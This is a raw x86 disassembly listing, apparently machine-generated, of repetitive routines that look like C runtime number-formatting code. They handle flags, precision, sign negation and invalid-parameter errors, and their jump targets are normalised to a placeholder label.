mov ecx [ eax - 0x4 ]
xor edx edx
jmp r-xdata
mov eax [ eax - 0x4 ]
jmp r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x8
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
mov ecx [ eax - 0x8 ]
mov edx [ eax - 0x4 ]
jmp r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
jmp r-xdata
mov eax ecx
or eax edx
jne r-xdata
mov [ esi + 0x28 ] eax
neg ecx
adc edx 0x0
neg edx
or edi 0x40
mov [ esi + 0x20 ] edi
test ecx ecx
jae r-xdata
push edi
mov edi [ esi + 0x20 ]
mov eax edi
shr eax 0x4
test al 0x1
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp ebx 0x8
jne r-xdata
and [ esi + 0x20 ] 0xffffffdf
push ecx
mov ecx esi
call sub_41b96b
push edx
push ecx
mov ecx esi
call sub_41bee7
jmp r-xdata
mov al 0x1
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov eax [ esi + 0x20 ]
shr eax 0x7
test al 0x1
je r-xdata
dec [ esi + 0x34 ]
mov ecx [ esi + 0x34 ]
mov [ ecx ] 0x30
inc [ esi + 0x38 ]
mov eax [ esi + 0x34 ]
cmp [ eax ] 0x30
je r-xdata
sub_4251ca
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
push [ esi + 0x2c ]
call sub_4230ce
and [ ebp - 0x8 ] 0x0
mov ebx eax
and [ ebp - 0x4 ] 0x0
pop ecx
mov ecx ebx
sub ecx 0x1
je r-xdata
mov eax [ esi + 0x20 ]
mov ecx esi
shr eax 0x4
test al 0x1
lea eax [ ebp - 0x8 ]
push eax
je r-xdata
sub ecx 0x1
je r-xdata
call sub_419349
call sub_4190d1
jmp r-xdata
mov eax [ esi + 0x20 ]
mov ecx esi
shr eax 0x4
test al 0x1
lea eax [ ebp - 0x8 ]
push eax
je r-xdata
dec ecx
sub ecx 0x1
je r-xdata
xor al al
jmp r-xdata
mov ecx esi
call sub_41f37a
test al al
je r-xdata
test al al
je r-xdata
call sub_419969
jmp r-xdata
call sub_4195c1
jmp r-xdata
mov eax [ esi + 0x20 ]
mov ecx esi
shr eax 0x4
test al 0x1
lea eax [ ebp - 0x8 ]
push eax
je r-xdata
sub ecx 0x4
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov al 0x1
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
push edi
mov edi [ esi + 0x20 ]
mov eax edi
shr eax 0x4
test al 0x1
je r-xdata
call sub_419e4d
jmp r-xdata
call sub_419be1
jmp r-xdata
mov eax [ esi + 0x20 ]
mov ecx esi
shr eax 0x4
test al 0x1
lea eax [ ebp - 0x8 ]
push eax
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
cmp [ esi + 0x28 ] 0x0
pop edi
jge r-xdata
test edx edx
jg r-xdata
call sub_41ae3d
jmp r-xdata
call sub_41ab85
jmp r-xdata
and [ esi + 0x20 ] 0xfffffff7
mov eax 0x200
cmp [ esi + 0x28 ] eax
jle r-xdata
mov [ esi + 0x28 ] 0x1
jmp r-xdata
jl r-xdata
mov eax ecx
or eax edx
jne r-xdata
mov [ esi + 0x28 ] eax
neg ecx
adc edx 0x0
neg edx
or edi 0x40
mov [ esi + 0x20 ] edi
test ecx ecx
jae r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp ebx 0x8
jne r-xdata
and [ esi + 0x20 ] 0xffffffdf
push ecx
mov ecx esi
call sub_41b9e0
push edx
push ecx
mov ecx esi
call sub_41bf6f
jmp r-xdata
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov eax [ esi + 0x20 ]
shr eax 0x7
test al 0x1
je r-xdata
dec [ esi + 0x34 ]
mov eax [ esi + 0x34 ]
mov [ eax ] 0x30
inc [ esi + 0x38 ]
mov eax [ esi + 0x34 ]
cmp [ eax ] 0x30
je r-xdata
sub_425348
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
push [ esi + 0x2c ]
call sub_4230ce
pop ecx
mov ebx eax
mov ecx ebx
sub ecx 0x1
je r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x4
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
je r-xdata
sub ecx 0x1
je r-xdata
movzx eax [ eax - 0x4 ]
movsx eax [ eax - 0x4 ]
jmp r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x4
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
je r-xdata
dec ecx
sub ecx 0x1
je r-xdata
cmp [ esi + 0x28 ] 0x0
pop edi
jge r-xdata
test edx edx
jg r-xdata
cdq
mov ecx eax
movzx eax [ eax - 0x4 ]
jmp r-xdata
movsx eax [ eax - 0x4 ]
jmp r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x4
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
je r-xdata
sub ecx 0x4
je r-xdata
and [ esi + 0x20 ] 0xfffffff7
mov eax 0x200
cmp [ esi + 0x28 ] eax
jle r-xdata
mov [ esi + 0x28 ] 0x1
jmp r-xdata
jl r-xdata
mov ecx [ eax - 0x4 ]
xor edx edx
jmp r-xdata
mov eax [ eax - 0x4 ]
jmp r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x8
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
mov ecx [ eax - 0x8 ]
mov edx [ eax - 0x4 ]
jmp r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
jmp r-xdata
mov eax ecx
or eax edx
jne r-xdata
mov [ esi + 0x28 ] eax
neg ecx
adc edx 0x0
neg edx
or edi 0x40
mov [ esi + 0x20 ] edi
test ecx ecx
jae r-xdata
push edi
mov edi [ esi + 0x20 ]
mov eax edi
shr eax 0x4
test al 0x1
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp ebx 0x8
jne r-xdata
and [ esi + 0x20 ] 0xffffffdf
push ecx
mov ecx esi
call sub_41ba55
push edx
push ecx
mov ecx esi
call sub_41bff7
jmp r-xdata
mov al 0x1
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov eax [ esi + 0x20 ]
shr eax 0x7
test al 0x1
je r-xdata
dec [ esi + 0x34 ]
mov ecx [ esi + 0x34 ]
mov [ ecx ] 0x30
inc [ esi + 0x38 ]
mov eax [ esi + 0x34 ]
cmp [ eax ] 0x30
je r-xdata
sub_425492
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
push [ esi + 0x2c ]
call sub_4230ce
pop ecx
mov ebx eax
mov ecx ebx
sub ecx 0x1
je r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x4
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
je r-xdata
sub ecx 0x1
je r-xdata
movzx eax [ eax - 0x4 ]
movsx eax [ eax - 0x4 ]
jmp r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x4
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
je r-xdata
dec ecx
sub ecx 0x1
je r-xdata
cmp [ esi + 0x28 ] 0x0
pop edi
jge r-xdata
test edx edx
jg r-xdata
cdq
mov ecx eax
movzx eax [ eax - 0x4 ]
jmp r-xdata
movsx eax [ eax - 0x4 ]
jmp r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x4
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
je r-xdata
sub ecx 0x4
je r-xdata
and [ esi + 0x20 ] 0xfffffff7
mov eax 0x200
cmp [ esi + 0x28 ] eax
jle r-xdata
mov [ esi + 0x28 ] 0x1
jmp r-xdata
jl r-xdata
mov ecx [ eax - 0x4 ]
xor edx edx
jmp r-xdata
mov eax [ eax - 0x4 ]
jmp r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x8
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
mov ecx [ eax - 0x8 ]
mov edx [ eax - 0x4 ]
jmp r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
jmp r-xdata
mov eax ecx
or eax edx
jne r-xdata
mov [ esi + 0x28 ] eax
neg ecx
adc edx 0x0
neg edx
or edi 0x40
mov [ esi + 0x20 ] edi
test ecx ecx
jae r-xdata
push edi
mov edi [ esi + 0x20 ]
mov eax edi
shr eax 0x4
test al 0x1
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp ebx 0x8
jne r-xdata
and [ esi + 0x20 ] 0xffffffdf
push ecx
mov ecx esi
call sub_41baca
push edx
push ecx
mov ecx esi
call sub_41c07f
jmp r-xdata
mov al 0x1
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov eax [ esi + 0x20 ]
shr eax 0x7
test al 0x1
je r-xdata
dec [ esi + 0x34 ]
mov ecx [ esi + 0x34 ]
mov [ ecx ] 0x30
inc [ esi + 0x38 ]
mov eax [ esi + 0x34 ]
cmp [ eax ] 0x30
je r-xdata
sub_4255dc
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
push [ esi + 0x2c ]
call sub_4230ce
and [ ebp - 0x8 ] 0x0
mov ebx eax
and [ ebp - 0x4 ] 0x0
pop ecx
mov ecx ebx
sub ecx 0x1
je r-xdata
mov eax [ esi + 0x20 ]
mov ecx esi
shr eax 0x4
test al 0x1
lea eax [ ebp - 0x8 ]
push eax
je r-xdata
sub ecx 0x1
je r-xdata
call sub_4193c8
call sub_419150
jmp r-xdata
mov eax [ esi + 0x20 ]
mov ecx esi
shr eax 0x4
test al 0x1
lea eax [ ebp - 0x8 ]
push eax
je r-xdata
dec ecx
sub ecx 0x1
je r-xdata
xor al al
jmp r-xdata
mov ecx esi
call sub_41f390
test al al
je r-xdata
test al al
je r-xdata
call sub_4199e8
jmp r-xdata
call sub_419640
jmp r-xdata
mov eax [ esi + 0x20 ]
mov ecx esi
shr eax 0x4
test al 0x1
lea eax [ ebp - 0x8 ]
push eax
je r-xdata
sub ecx 0x4
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov al 0x1
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
push edi
mov edi [ esi + 0x20 ]
mov eax edi
shr eax 0x4
test al 0x1
je r-xdata
call sub_419ed3
jmp r-xdata
call sub_419c5e
jmp r-xdata
mov eax [ esi + 0x20 ]
mov ecx esi
shr eax 0x4
test al 0x1
lea eax [ ebp - 0x8 ]
push eax
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
cmp [ esi + 0x28 ] 0x0
pop edi
jge r-xdata
test edx edx
jg r-xdata
call sub_41aecb
jmp r-xdata
call sub_41ac13
jmp r-xdata
and [ esi + 0x20 ] 0xfffffff7
mov eax 0x200
cmp [ esi + 0x28 ] eax
jle r-xdata
mov [ esi + 0x28 ] 0x1
jmp r-xdata
jl r-xdata
mov eax ecx
or eax edx
jne r-xdata
mov [ esi + 0x28 ] eax
neg ecx
adc edx 0x0
neg edx
or edi 0x40
mov [ esi + 0x20 ] edi
test ecx ecx
jae r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp ebx 0x8
jne r-xdata
and [ esi + 0x20 ] 0xffffffdf
push ecx
mov ecx esi
call sub_41bb3f
push edx
push ecx
mov ecx esi
call sub_41c107
jmp r-xdata
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov eax [ esi + 0x20 ]
shr eax 0x7
test al 0x1
je r-xdata
dec [ esi + 0x34 ]
mov eax [ esi + 0x34 ]
mov [ eax ] 0x30
inc [ esi + 0x38 ]
mov eax [ esi + 0x34 ]
cmp [ eax ] 0x30
je r-xdata
sub_42575a
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
push [ esi + 0x2c ]
call sub_4230ce
pop ecx
mov ebx eax
mov ecx ebx
sub ecx 0x1
je r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x4
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
je r-xdata
sub ecx 0x1
je r-xdata
movzx eax [ eax - 0x4 ]
movsx eax [ eax - 0x4 ]
jmp r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x4
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
je r-xdata
dec ecx
sub ecx 0x1
je r-xdata
cmp [ esi + 0x28 ] 0x0
pop edi
jge r-xdata
test edx edx
jg r-xdata
cdq
mov ecx eax
movzx eax [ eax - 0x4 ]
jmp r-xdata
movsx eax [ eax - 0x4 ]
jmp r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x4
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
je r-xdata
sub ecx 0x4
je r-xdata
and [ esi + 0x20 ] 0xfffffff7
mov eax 0x200
cmp [ esi + 0x28 ] eax
jle r-xdata
mov [ esi + 0x28 ] 0x1
jmp r-xdata
jl r-xdata
mov ecx [ eax - 0x4 ]
xor edx edx
jmp r-xdata
mov eax [ eax - 0x4 ]
jmp r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x8
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
mov ecx [ eax - 0x8 ]
mov edx [ eax - 0x4 ]
jmp r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
jmp r-xdata
mov eax ecx
or eax edx
jne r-xdata
mov [ esi + 0x28 ] eax
neg ecx
adc edx 0x0
neg edx
or edi 0x40
mov [ esi + 0x20 ] edi
test ecx ecx
jae r-xdata
push edi
mov edi [ esi + 0x20 ]
mov eax edi
shr eax 0x4
test al 0x1
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp ebx 0x8
jne r-xdata
and [ esi + 0x20 ] 0xffffffdf
push ecx
mov ecx esi
call sub_41bbb4
push edx
push ecx
mov ecx esi
call sub_41c18f
jmp r-xdata
mov al 0x1
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov eax [ esi + 0x20 ]
shr eax 0x7
test al 0x1
je r-xdata
dec [ esi + 0x34 ]
mov ecx [ esi + 0x34 ]
mov [ ecx ] 0x30
inc [ esi + 0x38 ]
mov eax [ esi + 0x34 ]
cmp [ eax ] 0x30
je r-xdata
sub_4258a4
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
push [ esi + 0x2c ]
call sub_4230ce
pop ecx
mov ebx eax
mov ecx ebx
sub ecx 0x1
je r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x4
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
je r-xdata
sub ecx 0x1
je r-xdata
movzx eax [ eax - 0x4 ]
movsx eax [ eax - 0x4 ]
jmp r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x4
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
je r-xdata
dec ecx
sub ecx 0x1
je r-xdata
cmp [ esi + 0x28 ] 0x0
pop edi
jge r-xdata
test edx edx
jg r-xdata
cdq
mov ecx eax
movzx eax [ eax - 0x4 ]
jmp r-xdata
movsx eax [ eax - 0x4 ]
jmp r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x4
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
je r-xdata
sub ecx 0x4
je r-xdata
and [ esi + 0x20 ] 0xfffffff7
mov eax 0x200
cmp [ esi + 0x28 ] eax
jle r-xdata
mov [ esi + 0x28 ] 0x1
jmp r-xdata
jl r-xdata
mov ecx [ eax - 0x4 ]
xor edx edx
jmp r-xdata
mov eax [ eax - 0x4 ]
jmp r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x8
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
mov ecx [ eax - 0x8 ]
mov edx [ eax - 0x4 ]
jmp r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
jmp r-xdata
mov eax ecx
or eax edx
jne r-xdata
mov [ esi + 0x28 ] eax
neg ecx
adc edx 0x0
neg edx
or edi 0x40
mov [ esi + 0x20 ] edi
test ecx ecx
jae r-xdata
push edi
mov edi [ esi + 0x20 ]
mov eax edi
shr eax 0x4
test al 0x1
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp ebx 0x8
jne r-xdata
and [ esi + 0x20 ] 0xffffffdf
push ecx
mov ecx esi
call sub_41bc29
push edx
push ecx
mov ecx esi
call sub_41c217
jmp r-xdata
mov al 0x1
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov eax [ esi + 0x20 ]
shr eax 0x7
test al 0x1
je r-xdata
dec [ esi + 0x34 ]
mov ecx [ esi + 0x34 ]
mov [ ecx ] 0x30
inc [ esi + 0x38 ]
mov eax [ esi + 0x34 ]
cmp [ eax ] 0x30
je r-xdata
sub_4259ee
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
push [ esi + 0x2c ]
call sub_4230ce
and [ ebp - 0x8 ] 0x0
mov ebx eax
and [ ebp - 0x4 ] 0x0
pop ecx
mov ecx ebx
sub ecx 0x1
je r-xdata
mov eax [ esi + 0x20 ]
mov ecx esi
shr eax 0x4
test al 0x1
lea eax [ ebp - 0x8 ]
push eax
je r-xdata
sub ecx 0x1
je r-xdata
call sub_419447
call sub_4191cf
jmp r-xdata
mov eax [ esi + 0x20 ]
mov ecx esi
shr eax 0x4
test al 0x1
lea eax [ ebp - 0x8 ]
push eax
je r-xdata
dec ecx
sub ecx 0x1
je r-xdata
xor al al
jmp r-xdata
mov ecx esi
call sub_41f3a6
test al al
je r-xdata
test al al
je r-xdata
call sub_419a67
jmp r-xdata
call sub_4196bf
jmp r-xdata
mov eax [ esi + 0x20 ]
mov ecx esi
shr eax 0x4
test al 0x1
lea eax [ ebp - 0x8 ]
push eax
je r-xdata
sub ecx 0x4
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov al 0x1
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
push edi
mov edi [ esi + 0x20 ]
mov eax edi
shr eax 0x4
test al 0x1
je r-xdata
call sub_419f59
jmp r-xdata
call sub_419cdb
jmp r-xdata
mov eax [ esi + 0x20 ]
mov ecx esi
shr eax 0x4
test al 0x1
lea eax [ ebp - 0x8 ]
push eax
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
cmp [ esi + 0x28 ] 0x0
pop edi
jge r-xdata
test edx edx
jg r-xdata
call sub_41af59
jmp r-xdata
call sub_41aca1
jmp r-xdata
and [ esi + 0x20 ] 0xfffffff7
mov eax 0x200
cmp [ esi + 0x28 ] eax
jle r-xdata
mov [ esi + 0x28 ] 0x1
jmp r-xdata
jl r-xdata
mov eax ecx
or eax edx
jne r-xdata
mov [ esi + 0x28 ] eax
neg ecx
adc edx 0x0
neg edx
or edi 0x40
mov [ esi + 0x20 ] edi
test ecx ecx
jae r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp ebx 0x8
jne r-xdata
and [ esi + 0x20 ] 0xffffffdf
push ecx
mov ecx esi
call sub_41bc9e
push edx
push ecx
mov ecx esi
call sub_41c29f
jmp r-xdata
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov eax [ esi + 0x20 ]
shr eax 0x7
test al 0x1
je r-xdata
dec [ esi + 0x34 ]
mov eax [ esi + 0x34 ]
mov [ eax ] 0x30
inc [ esi + 0x38 ]
mov eax [ esi + 0x34 ]
cmp [ eax ] 0x30
je r-xdata
sub_425b6c
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
push [ esi + 0x2c ]
call sub_4230ce
pop ecx
mov ebx eax
mov ecx ebx
sub ecx 0x1
je r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x4
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
je r-xdata
sub ecx 0x1
je r-xdata
movzx eax [ eax - 0x4 ]
movsx eax [ eax - 0x4 ]
jmp r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x4
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
je r-xdata
dec ecx
sub ecx 0x1
je r-xdata
cmp [ esi + 0x28 ] 0x0
pop edi
jge r-xdata
test edx edx
jg r-xdata
cdq
mov ecx eax
movzx eax [ eax - 0x4 ]
jmp r-xdata
movsx eax [ eax - 0x4 ]
jmp r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x4
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
je r-xdata
sub ecx 0x4
je r-xdata
and [ esi + 0x20 ] 0xfffffff7
mov eax 0x200
cmp [ esi + 0x28 ] eax
jle r-xdata
mov [ esi + 0x28 ] 0x1
jmp r-xdata
jl r-xdata
mov ecx [ eax - 0x4 ]
xor edx edx
jmp r-xdata
mov eax [ eax - 0x4 ]
jmp r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x8
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
mov ecx [ eax - 0x8 ]
mov edx [ eax - 0x4 ]
jmp r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
jmp r-xdata
mov eax ecx
or eax edx
jne r-xdata
mov [ esi + 0x28 ] eax
neg ecx
adc edx 0x0
neg edx
or edi 0x40
mov [ esi + 0x20 ] edi
test ecx ecx
jae r-xdata
push edi
mov edi [ esi + 0x20 ]
mov eax edi
shr eax 0x4
test al 0x1
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp ebx 0x8
jne r-xdata
and [ esi + 0x20 ] 0xffffffdf
push ecx
mov ecx esi
call sub_41bd13
push edx
push ecx
mov ecx esi
call sub_41c327
jmp r-xdata
mov al 0x1
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov eax [ esi + 0x20 ]
shr eax 0x7
test al 0x1
je r-xdata
dec [ esi + 0x34 ]
mov ecx [ esi + 0x34 ]
mov [ ecx ] 0x30
inc [ esi + 0x38 ]
mov eax [ esi + 0x34 ]
cmp [ eax ] 0x30
je r-xdata
sub_425cb6
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
push [ esi + 0x2c ]
call sub_4230ce
pop ecx
mov ebx eax
mov ecx ebx
sub ecx 0x1
je r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x4
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
je r-xdata
sub ecx 0x1
je r-xdata
movzx eax [ eax - 0x4 ]
movsx eax [ eax - 0x4 ]
jmp r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x4
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
je r-xdata
dec ecx
sub ecx 0x1
je r-xdata
cmp [ esi + 0x28 ] 0x0
pop edi
jge r-xdata
test edx edx
jg r-xdata
cdq
mov ecx eax
movzx eax [ eax - 0x4 ]
jmp r-xdata
movsx eax [ eax - 0x4 ]
jmp r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x4
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
je r-xdata
sub ecx 0x4
je r-xdata
and [ esi + 0x20 ] 0xfffffff7
mov eax 0x200
cmp [ esi + 0x28 ] eax
jle r-xdata
mov [ esi + 0x28 ] 0x1
jmp r-xdata
jl r-xdata
mov ecx [ eax - 0x4 ]
xor edx edx
jmp r-xdata
mov eax [ eax - 0x4 ]
jmp r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x8
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
mov ecx [ eax - 0x8 ]
mov edx [ eax - 0x4 ]
jmp r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
jmp r-xdata
mov eax ecx
or eax edx
jne r-xdata
mov [ esi + 0x28 ] eax
neg ecx
adc edx 0x0
neg edx
or edi 0x40
mov [ esi + 0x20 ] edi
test ecx ecx
jae r-xdata
push edi
mov edi [ esi + 0x20 ]
mov eax edi
shr eax 0x4
test al 0x1
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp ebx 0x8
jne r-xdata
and [ esi + 0x20 ] 0xffffffdf
push ecx
mov ecx esi
call sub_41bd88
push edx
push ecx
mov ecx esi
call sub_41c3af
jmp r-xdata
mov al 0x1
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov eax [ esi + 0x20 ]
shr eax 0x7
test al 0x1
je r-xdata
dec [ esi + 0x34 ]
mov ecx [ esi + 0x34 ]
mov [ ecx ] 0x30
inc [ esi + 0x38 ]
mov eax [ esi + 0x34 ]
cmp [ eax ] 0x30
je r-xdata
sub_425e00
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
push [ esi + 0x2c ]
call sub_4230ce
and [ ebp - 0x8 ] 0x0
mov ebx eax
and [ ebp - 0x4 ] 0x0
pop ecx
mov ecx ebx
sub ecx 0x1
je r-xdata
mov eax [ esi + 0x20 ]
mov ecx esi
shr eax 0x4
test al 0x1
lea eax [ ebp - 0x8 ]
push eax
je r-xdata
sub ecx 0x1
je r-xdata
call sub_4194c6
call sub_41924e
jmp r-xdata
mov eax [ esi + 0x20 ]
mov ecx esi
shr eax 0x4
test al 0x1
lea eax [ ebp - 0x8 ]
push eax
je r-xdata
dec ecx
sub ecx 0x1
je r-xdata
xor al al
jmp r-xdata
mov ecx esi
call sub_41f3bc
test al al
je r-xdata
test al al
je r-xdata
call sub_419ae6
jmp r-xdata
call sub_41973e
jmp r-xdata
mov eax [ esi + 0x20 ]
mov ecx esi
shr eax 0x4
test al 0x1
lea eax [ ebp - 0x8 ]
push eax
je r-xdata
sub ecx 0x4
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov al 0x1
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
push edi
mov edi [ esi + 0x20 ]
mov eax edi
shr eax 0x4
test al 0x1
je r-xdata
call sub_419fdf
jmp r-xdata
call sub_419d58
jmp r-xdata
mov eax [ esi + 0x20 ]
mov ecx esi
shr eax 0x4
test al 0x1
lea eax [ ebp - 0x8 ]
push eax
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
cmp [ esi + 0x28 ] 0x0
pop edi
jge r-xdata
test edx edx
jg r-xdata
call sub_41afe7
jmp r-xdata
call sub_41ad2f
jmp r-xdata
and [ esi + 0x20 ] 0xfffffff7
mov eax 0x200
cmp [ esi + 0x28 ] eax
jle r-xdata
mov [ esi + 0x28 ] 0x1
jmp r-xdata
jl r-xdata
mov eax ecx
or eax edx
jne r-xdata
mov [ esi + 0x28 ] eax
neg ecx
adc edx 0x0
neg edx
or edi 0x40
mov [ esi + 0x20 ] edi
test ecx ecx
jae r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp ebx 0x8
jne r-xdata
and [ esi + 0x20 ] 0xffffffdf
push ecx
mov ecx esi
call sub_41bdfd
push edx
push ecx
mov ecx esi
call sub_41c437
jmp r-xdata
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov eax [ esi + 0x20 ]
shr eax 0x7
test al 0x1
je r-xdata
dec [ esi + 0x34 ]
mov eax [ esi + 0x34 ]
mov [ eax ] 0x30
inc [ esi + 0x38 ]
mov eax [ esi + 0x34 ]
cmp [ eax ] 0x30
je r-xdata
sub_425f7e
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
push [ esi + 0x2c ]
call sub_4230ce
pop ecx
mov ebx eax
mov ecx ebx
sub ecx 0x1
je r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x4
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
je r-xdata
sub ecx 0x1
je r-xdata
movzx eax [ eax - 0x4 ]
movsx eax [ eax - 0x4 ]
jmp r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x4
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
je r-xdata
dec ecx
sub ecx 0x1
je r-xdata
cmp [ esi + 0x28 ] 0x0
pop edi
jge r-xdata
test edx edx
jg r-xdata
cdq
mov ecx eax
movzx eax [ eax - 0x4 ]
jmp r-xdata
movsx eax [ eax - 0x4 ]
jmp r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x4
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
je r-xdata
sub ecx 0x4
je r-xdata
and [ esi + 0x20 ] 0xfffffff7
mov eax 0x200
cmp [ esi + 0x28 ] eax
jle r-xdata
mov [ esi + 0x28 ] 0x1
jmp r-xdata
jl r-xdata
mov ecx [ eax - 0x4 ]
xor edx edx
jmp r-xdata
mov eax [ eax - 0x4 ]
jmp r-xdata
mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x8
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
mov ecx [ eax - 0x8 ]
mov edx [ eax - 0x4 ]
jmp r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
